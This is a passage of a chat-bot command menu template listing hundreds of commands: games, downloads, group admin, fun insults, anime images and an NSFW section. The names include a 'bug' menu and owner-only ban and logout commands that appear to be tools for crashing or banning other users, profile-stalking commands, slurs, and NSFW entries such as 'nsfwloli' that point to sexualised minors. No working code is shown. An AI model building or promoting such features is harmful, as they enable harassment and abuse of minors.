々 ${prefix}post  *ᴏᴡɴᴇʀ*
└ ◦ ${prefix}jpm  *ᴏᴡɴᴇʀ*

 *𖣂  B U G  M E N U ッ* 
 
┌ ◦ ${prefix}🥶  *ᴏᴡɴᴇʀ*
々  .🤣  *ᴏᴡɴᴇʀ*
々  .😂  *ᴏᴡɴᴇʀ*
々  .😘  *ᴏᴡɴᴇʀ*
々  .💔  *ᴏᴡɴᴇʀ*
々  .👊  *ᴏᴡɴᴇʀ*
└ ◦ ${prefix}😱  *ᴏᴡɴᴇʀ*

 *𖣂  G A M E   M E N U ッ* 
 
々 ${prefix}tebak gambar
々 ${prefix}tebak lirik
々 ${prefix}tebak lagu
々 ${prefix}tebak kalimat
々 ${prefix}tebak kata
々 ${prefix}tebak Bendera
々 ${prefix}tebak Bendera2
々 ${prefix}tebak Kabupaten
々 ${prefix}tebak Kimia
々 ${prefix}tebak Asahotak
々 ${prefix}tebak Siapakahaku
々 ${prefix}tebak Susunkata
々 ${prefix}tebak Tekateki
々 ${prefix}math
々 ${prefix}math Noob
々 ${prefix}math Easy
々 ${prefix}math Medium
々 ${prefix}math Hard
々 ${prefix}math Extreme
々 ${prefix}math Impossible
々 ${prefix}math Impossible2

 *𖣂  A I  M E N U ッ* 
 
┌ ◦ ${prefix}toanime  *ғʀᴇᴇ*
々 ${prefix}ai  *ғʀᴇᴇ*
々 ${prefix}paptt  *ғʀᴇᴇ*
々 ${prefix}openai  *ғʀᴇᴇ*
々 ${prefix}removebg  *ғʀᴇᴇ*
└ ◦ ${prefix}tohd  *ғʀᴇᴇ*

*𖣂  B A N N E D ッ* 

┌ ◦ ${prefix}banhenz1 * ᴏᴡɴᴇʀ 
々 ${prefix}banhenz2  *ᴏᴡɴᴇʀ*
々 ${prefix}banhenz3  *ᴏᴡɴᴇʀ*
々 ${prefix}banhenz4  *ᴏᴡɴᴇʀ*
々 ${prefix}verify  *ᴏᴡɴᴇʀ*
└ ◦ ${prefix}logout  *ᴏᴡɴᴇʀ*

*𖣂  U N B A N N E D ッ*   

┌ ◦ ${prefix}unbanhenz1  *ᴏᴡɴᴇʀ*
々 ${prefix}unbanhenz2  *ᴏᴡɴᴇʀ*
々 ${prefix}unbanhenz3  *ᴏᴡɴᴇʀ*
々 ${prefix}unbanhenz4  *ᴏᴡɴᴇʀ*
々 ${prefix}unbanhenz5  *ᴏᴡɴᴇʀ*
々 ${prefix}unbanhenz6  *ᴏᴡɴᴇʀ*
└ ◦ ${prefix}unbanhenz7  *ᴏᴡɴᴇʀ*

*𖣂 D O W N L O A D ッ* 

┌ ◦ ${prefix}tiktokvideo  *ғʀᴇᴇ*
々 ${prefix}tiktokaudio  *ғʀᴇᴇ*
々 ${prefix}ytsearch  *ғʀᴇᴇ*
々 ${prefix}mediafire  *ғʀᴇᴇ*
々 ${prefix}play  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}ytmp3  *ғʀᴇᴇ*
々 ${prefix}ytmp4  *ғʀᴇᴇ*
々 ${prefix}google  *ғʀᴇᴇ*
々 ${prefix}spotify  *ғʀᴇᴇ*
々 ${prefix}gitclone  *ғʀᴇᴇ*
└ ◦ ${prefix}happymod  *ғʀᴇᴇ*

*𖣂 A N T I  M E N U ッ*

┌ ◦ ${prefix}antilinkgc  *ɢʀᴏᴜᴘ*
々 ${prefix}antiwame  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkall  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinktiktok  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkfb  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinktwitter  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkig  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinktg  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkytvid  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkytch  *ɢʀᴏᴜᴘ*
々 ${prefix}antivirus  *ɢʀᴏᴜᴘ*
々 ${prefix}antitoxic  *ɢʀᴏᴜᴘ*
々 ${prefix}antilink  *ɢʀᴏᴜᴘ*
└ ◦ ${prefix}antiwame  *ɢʀᴏᴜᴘ*

*𖣂 G R O U P  M E N U ッ*

┌ ◦ ${prefix}grouplink  *ɢʀᴏᴜᴘ*
々 ${prefix}ephemeral * ɢʀᴏᴜᴘ 
々 ${prefix}delete  *ɢʀᴏᴜᴘ*
々 ${prefix}setppgroup  *ɢʀᴏᴜᴘ*
々 ${prefix}setname  *ɢʀᴏᴜᴘ*
々 ${prefix}setdesc  *ɢʀᴏᴜᴘ*
々 ${prefix}add  *ɢʀᴏᴜᴘ*
々 ${prefix}kick  *ɢʀᴏᴜᴘ*
々 ${prefix}promote  *ɢʀᴏᴜᴘ*
々 ${prefix}demote  *ɢʀᴏᴜᴘ*
々 ${prefix}hidetag  *ɢʀᴏᴜᴘ*
々 ${prefix}tagall  *ɢʀᴏᴜᴘ*
々 ${prefix}editinfo  *ɢʀᴏᴜᴘ*
々 ${prefix}opentime  *ɢʀᴏᴜᴘ*
々 ${prefix}closetime  *ɢʀᴏᴜᴘ*
々 ${prefix}resetlink  *ɢʀᴏᴜᴘ*
々 ${prefix}autostickerpc  *ɢʀᴏᴜᴘ*
々 ${prefix}nsfw  *ɢʀᴏᴜᴘ*
└ ◦ ${prefix}react  *ɢʀᴏᴜᴘ*

*𖣂 R A N D O M  V I D E O ッ*

┌ ◦ ${prefix}tiktokgirl  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}tiktoknukthy  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}tiktokkayes  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}tiktokpanrika  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}tiktoknotnot  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}tiktokghea  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}tiktoksantuy  *ᴘʀᴇᴍɪᴜᴍ*
└ ◦ ${prefix}tiktokbocil  *ᴘʀᴇᴍɪᴜᴍ*

*𖣂 S T A L K  M E N U ッ*

┌ ◦ ${prefix}igstalk  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}ffstalk  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}mlstalk  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}npmstalk  *ᴘʀᴇᴍɪᴜᴍ*
└ ◦ ${prefix}ghstalk  *ᴘʀᴇᴍɪᴜᴍ*

*𖣂 O T H E R  M E N U ッ*

┌ ◦ ${prefix}ping  *ғʀᴇᴇ*
々 ${prefix}menu  *ғʀᴇᴇ*
々 ${prefix}listpem  *ғʀᴇᴇ*
々 ${prefix}liststicker  *ғʀᴇᴇ*
々 ${prefix}listimage  *ғʀᴇᴇ*
々 ${prefix}listvideo  *ғʀᴇᴇ*
々 ${prefix}listvn  *ғʀᴇᴇ*
々 ${prefix}listbadword  *ғʀᴇᴇ*
々 ${prefix}listpc  *ғʀᴇᴇ*
々 ${prefix}listgc  *ғʀᴇᴇ*
々 ${prefix}owner  *ғʀᴇᴇ*
々 ${prefix}tyabot  *ғʀᴇᴇ*
々 ${prefix}listtyabot  *ғʀᴇᴇ*
々 ${prefix}donate  *ғʀᴇᴇ*
々 ${prefix}friend  *ғʀᴇᴇ*
々 ${prefix}obfuscate  *ғʀᴇᴇ*
々 ${prefix}styletext  *ғʀᴇᴇ*
々 ${prefix}fliptext  *ғʀᴇᴇ*
々 ${prefix}tts  *ғʀᴇᴇ*
々 ${prefix}say  *ғʀᴇᴇ*
々 ${prefix}togif  *ғʀᴇᴇ*
々 ${prefix}toqr  *ғʀᴇᴇ*
々 ${prefix}bass  *ғʀᴇᴇ*
々 ${prefix}blown  *ғʀᴇᴇ*
々 ${prefix}deep  *ғʀᴇᴇ*
々 ${prefix}earrape  *ғʀᴇᴇ*
々 ${prefix}fast  *ғʀᴇᴇ*
々 ${prefix}fat  *ғʀᴇᴇ*
々 ${prefix}nightcore  *ғʀᴇᴇ*
々 ${prefix}reverse  *ғʀᴇᴇ*
々 ${prefix}robot  *ғʀᴇᴇ*
々 ${prefix}slow  *ғʀᴇᴇ*
々 ${prefix}smooth  *ғʀᴇᴇ*
々 ${prefix}squirrel  *ғʀᴇᴇ*
々 ${prefix}tinyurl  *ғʀᴇᴇ*
々 ${prefix}tovn  *ғʀᴇᴇ*
々 ${prefix}toaudio  *ғʀᴇᴇ*
々 ${prefix}tomp3  *ғʀᴇᴇ*
々 ${prefix}tomp4 *ғʀᴇᴇ*
々 ${prefix}toimg  *ғʀᴇᴇ*
々 ${prefix}toonce  *ғʀᴇᴇ*
々 ${prefix}sticker  *ғʀᴇᴇ*
々 ${prefix}take  *ғʀᴇᴇ*
々 ${prefix}emoji  *ғʀᴇᴇ*
々 ${prefix}volume  *ғʀᴇᴇ*
々 ${prefix}ebinary  *ғʀᴇᴇ*
々 ${prefix}dbinary  *ғʀᴇᴇ*
々 ${prefix}ssweb  *ғʀᴇᴇ*
々 ${prefix}quoted  *ғʀᴇᴇ*
々 ${prefix}runtime  *ғʀᴇᴇ*
└ ◦ ${prefix}sound1 - sound161  *ғʀᴇᴇ*

*𖣂 F U N  M E N Uッ*

┌ ◦ ${prefix}define  *ғʀᴇᴇ*
々 ${prefix}truth  *ғʀᴇᴇ*
々 ${prefix}dare  *ғʀᴇᴇ*
々 ${prefix}couple  *ғʀᴇᴇ*
々 ${prefix}soulmate  *ғʀᴇᴇ*
々 ${prefix}stupidcheck  *ғʀᴇᴇ*
々 ${prefix}handsomecheck  *ғʀᴇᴇ*
々 ${prefix}uncleancheck  *ғʀᴇᴇ*
々 ${prefix}hotcheck  *ғʀᴇᴇ*
々 ${prefix}smartcheck  *ғʀᴇᴇ*
々 ${prefix}greatcheck  *ғʀᴇᴇ*
々 ${prefix}evilcheck  *ғʀᴇᴇ*
々 ${prefix}dogcheck  *ғʀᴇᴇ*
々 ${prefix}coolcheck  *ғʀᴇᴇ*
々 ${prefix}waifucheck  *ғʀᴇᴇ*
々 ${prefix}awesomecheck  *ғʀᴇᴇ*
々 ${prefix}gaycheck  *ғʀᴇᴇ*
々 ${prefix}cutecheck  *ғʀᴇᴇ*
々 ${prefix}lesbiancheck  *ғʀᴇᴇ*
々 ${prefix}hornycheck  *ғʀᴇᴇ*
々 ${prefix}prettycheck  *ғʀᴇᴇ*
々 ${prefix}lovelycheck  *ғʀᴇᴇ*
々 ${prefix}uglycheck  *ғʀᴇᴇ*
々 ${prefix}hot  *ғʀᴇᴇ*
々 ${prefix}sexy  *ғʀᴇᴇ*
々 ${prefix}kind  *ғʀᴇᴇ*
々 ${prefix}idiot  *ғʀᴇᴇ*
々 ${prefix}handsome  *ғʀᴇᴇ*
々 ${prefix}beautiful  *ғʀᴇᴇ*
々 ${prefix}cute  *ғʀᴇᴇ*
々 ${prefix}pretty  *ғʀᴇᴇ*
々 ${prefix}lesbian  *ғʀᴇᴇ*
々 ${prefix}noob  *ғʀᴇᴇ*
々 ${prefix}bastard  *ғʀᴇᴇ*
々 ${prefix}foolish  *ғʀᴇᴇ*
々 ${prefix}nerd  *ғʀᴇᴇ*
々 ${prefix}asshole  *ғʀᴇᴇ*
々 ${prefix}gay  *ғʀᴇᴇ*
々 ${prefix}smart  *ғʀᴇᴇ*
々 ${prefix}stubble  *ғʀᴇᴇ*
々 ${prefix}doggo  *ғʀᴇᴇ*
々 ${prefix}horny  *ғʀᴇᴇ*
々 ${prefix}cunt  *ғʀᴇᴇ*
々 ${prefix}wibu  *ғʀᴇᴇ*
々 ${prefix}noobra  *ғʀᴇᴇ*
々 ${prefix}nibba  *ғʀᴇᴇ*
々 ${prefix}nibbi  *ғʀᴇᴇ*
々 ${prefix}comrade  *ғʀᴇᴇ*
々 ${prefix}mumu  *ғʀᴇᴇ*
々 ${prefix}rascal  *ғʀᴇᴇ*
々 ${prefix}scumbag  *ғʀᴇᴇ* 
々 ${prefix}nuts  *ғʀᴇᴇ*
々 ${prefix}fagot  *ғʀᴇᴇ*
々 ${prefix}scoundrel  *ғʀᴇᴇ*
々 ${prefix}ditch  *ғʀᴇᴇ*
々 ${prefix}dope  *ғʀᴇᴇ*
々 ${prefix}gucci  *ғʀᴇᴇ*
々 ${prefix}lit  *ғʀᴇᴇ*
々 ${prefix}dumbass  *ғʀᴇᴇ*
々 ${prefix}crackhead  *ғʀᴇᴇ*
々 ${prefix}mf  *ғʀᴇᴇ*
々 ${prefix}motherfucker  *ғʀᴇᴇ*
々 ${prefix}sucker  *ғʀᴇᴇ*
々 ${prefix}fuckboy  *ғʀᴇᴇ*
々 ${prefix}playboy  *ғʀᴇᴇ*
々 ${prefix}fuckgirl  *ғʀᴇᴇ*
々 ${prefix}playgirl  *ғʀᴇᴇ*
々 ${prefix}quotes  *ғʀᴇᴇ*
々 ${prefix}can  *ғʀᴇᴇ*
々 ${prefix}is  *ғʀᴇᴇ*
々 ${prefix}when  *ғʀᴇᴇ*
々 ${prefix}where  *ғʀᴇᴇ*
々 ${prefix}what  *ғʀᴇᴇ*
々 ${prefix}how  *ғʀᴇᴇ*
々 ${prefix}rate  *ғʀᴇᴇ*
々 ${prefix}cry  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}kill  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}hug  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}pat  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}lick  *ᴘʀᴇᴍɪᴜᴍ* 
々 ${prefix}kiss  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}bite  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}yeet  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}bully  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}bonk  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}wink  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}poke  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}nom  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}slap  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}smile  *ᴘʀᴇᴍɪᴜᴍ* 
々 ${prefix}wave  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}awoo  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}blush  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}smug  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}glomp  *ᴘʀᴇᴍɪᴜᴍ* 
々 ${prefix}happy  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}dance  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}cringe  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}cuddle  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}highfive  *ᴘʀᴇᴍɪᴜᴍ* 
々 ${prefix}shinobu  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}handhold  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}horny  *ғʀᴇᴇ*
々 ${prefix}checkme  *ғʀᴇᴇ*
々 ${prefix}confess  *ғʀᴇᴇ*
└ ◦ ${prefix}leave  *ғʀᴇᴇ*

*𖣂 R A N D O M  P H O T O ッ*

┌ ◦ ${prefix}aesthetic  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}coffee  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}wikimedia  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}wallpaper  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}art  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}bts  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}woof  *ғʀᴇᴇ*
々 ${prefix}meow  *ғʀᴇᴇ*
々 ${prefix}lizard  *ғʀᴇᴇ*
々 ${prefix}cosplay  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}hacker  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}cyber  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}gamewallpaper  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}islamic  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}jennie  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}jiso  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}satanic  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}justina  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}cartoon  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}pentol  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}cat  *ғʀᴇᴇ*
々 ${prefix}kpop  *ғʀᴇᴇ*
々 ${prefix}exo  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}lisa  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}space  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}car  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}technology  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}bike  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}shortquote  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}antiwork  *ғʀᴇᴇ*
々 ${prefix}hacking  *ғʀᴇᴇ*
々 ${prefix}boneka  *ғʀᴇᴇ*
々 ${prefix}rose  *ғʀᴇᴇ*
々 ${prefix}ryujin  *ғʀᴇᴇ*
々 ${prefix}ulzzangboy  *ғʀᴇᴇ*
々 ${prefix}ulzzanggirl  *ғʀᴇᴇ*
々 ${prefix}wallml  *ғʀᴇᴇ*
々 ${prefix}wallphone  *ғʀᴇᴇ*
々 ${prefix}mountain  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}goose  *ғʀᴇᴇ*
々 ${prefix}profilepic  *ғʀᴇᴇ*
々 ${prefix}couplepic  *ғʀᴇᴇ*
々 ${prefix}programming  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}pubg  *ғʀᴇᴇ*
々 ${prefix}blackpink  *ғʀᴇᴇ*
々 ${prefix}randomboy  *ғʀᴇᴇ*  
々 ${prefix}randomgirl  *ғʀᴇᴇ*
々 ${prefix}hijab  *ғʀᴇᴇ*  
々 ${prefix}chinese  *ғʀᴇᴇ*
々 ${prefix}indo  *ғʀᴇᴇ*
々 ${prefix}japanese  *ғʀᴇᴇ*
々 ${prefix}korean  *ғʀᴇᴇ*
々 ${prefix}malay  *ғʀᴇᴇ*
々 ${prefix}thai  *ғʀᴇᴇ*
└ ◦ ${prefix}vietnamese  *ғʀᴇᴇ*

*𖣂 A N I M E ッ*

┌ ◦ ${prefix}akira  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}akiyama  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}ana  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}asuna  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}ayuzawa  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}boruto  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}chiho  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}chitoge  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}cosplayloli  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}cosplaysagiri  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}deidara  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}doraemon  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}elaina  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}emilia  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}erza  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}gremory  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}hestia  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}hinata  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}husbu  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}inori  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}isuzu  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}itachi  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}itori  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}kaga  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}kagura  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}kakasih  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}kaori  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}keneki  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}kotori  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}kurumi  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}loli  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}madara  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}megumin  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}mikasa  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}mikey  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}miku  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}minato  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}naruto  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}neko  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}neko2  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}nekonime  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}nezuko  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}onepiece  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}pokemon  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}randomnime  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}randomnime2  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}rize  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}sagiri  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}sakura  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}sasuke  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}shina  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}shinka  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}shinomiya  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}shizuka  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}shota  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}tejina  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}toukachan  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}tsunade  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}waifu  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}animewall  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}yotsuba  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}yuki  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}yulibocil  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}yumeko  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}8ball  *ғʀᴇᴇ*
々 ${prefix}tickle  *ғʀᴇᴇ*
々 ${prefix}gecg  *ғʀᴇᴇ*
└ ◦ ${prefix}feed  *ғʀᴇᴇ*

*𖣂 N S F W ッ*

┌ ◦ ${prefix}hentai  *ғʀᴇᴇ*
々 ${prefix}gifhentai  *ғʀᴇᴇ*
々 ${prefix}gifblowjob  *ғʀᴇᴇ*
々 ${prefix}hentaivid  *ғʀᴇᴇ*
々 ${prefix}hneko  *ғʀᴇᴇ*
々 ${prefix}nwaifu  *ғʀᴇᴇ*
々 ${prefix}animespank  *ғʀᴇᴇ*
々 ${prefix}trap  *ғʀᴇᴇ*
々 ${prefix}gasm  *ғʀᴇᴇ*
々 ${prefix}ahegao  *ғʀᴇᴇ*
々 ${prefix}ass  *ғʀᴇᴇ*
々 ${prefix}bdsm  *ғʀᴇᴇ*
々 ${prefix}blowjob  *ғʀᴇᴇ*
々 ${prefix}cuckold  *ғʀᴇᴇ*
々 ${prefix}cum  *ғʀᴇᴇ*
々 ${prefix}milf  *ғʀᴇᴇ*
々 ${prefix}eba  *ғʀᴇᴇ*
々 ${prefix}ero  *ғʀᴇᴇ*
々 ${prefix}femdom  *ғʀᴇᴇ*
々 ${prefix}foot  *ғʀᴇᴇ*
々 ${prefix}gangbang  *ғʀᴇᴇ*
々 ${prefix}glasses  *ғʀᴇᴇ*
々 ${prefix}jahy  *ғʀᴇᴇ*
々 ${prefix}masturbation  *ғʀᴇᴇ*
々 ${prefix}manga  *ғʀᴇᴇ*
々 ${prefix}neko-hentai  *ғʀᴇᴇ*
々 ${prefix}neko-hentai2  *ғʀᴇᴇ*
々 ${prefix}nsfwloli  *ғʀᴇᴇ*
々 ${prefix}orgy  *ғʀᴇᴇ*
々 ${prefix}panties  *ғʀᴇᴇ* 
々 ${prefix}pussy  *ғʀᴇᴇ*
々 ${prefix}tentacles  *ғʀᴇᴇ*
々 ${prefix}thights  *ғʀᴇᴇ*
々 ${prefix}yuri  *ғʀᴇᴇ*
└ ◦ ${prefix}zettai  *ғʀᴇᴇ*

*𖣂 T E X T P R O  M A K E R ッ*

┌ ◦ ${prefix}candy  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}christmas  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}3dchristmas  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}sparklechristmas  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}deepsea  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}scifi  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}rainbow  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}waterpipe  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}spooky  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}pencil  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}circuit  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}discovery  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}metalic  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}fiction  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}demon  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}transformer  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}berry  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}thunder  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}magma  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}3dstone  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}neonlight  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}glitch  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}harrypotter  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}brokenglass  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}papercut  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}watercolor  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}multicolor  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}neondevil  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}underwater  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}graffitibike  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}snow  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}cloud  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}honey  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}ice  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}fruitjuice  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}biscuit  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}wood  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}chocolate  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}strawberry  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}matrix  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}blood  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}dropwater  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}toxic  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}lava  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}rock  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}bloodglas  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}hallowen  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}darkgold  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}joker  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}wicker  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}firework  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}skeleton  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}blackpink  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}sand  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}glue  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}1917  *ᴘʀᴇᴍɪᴜᴍ*
└ ◦ ${prefix}leaves  *ᴘʀᴇᴍɪᴜᴍ*

*𖣂 P H O T O O X Y  M A K E R ッ*

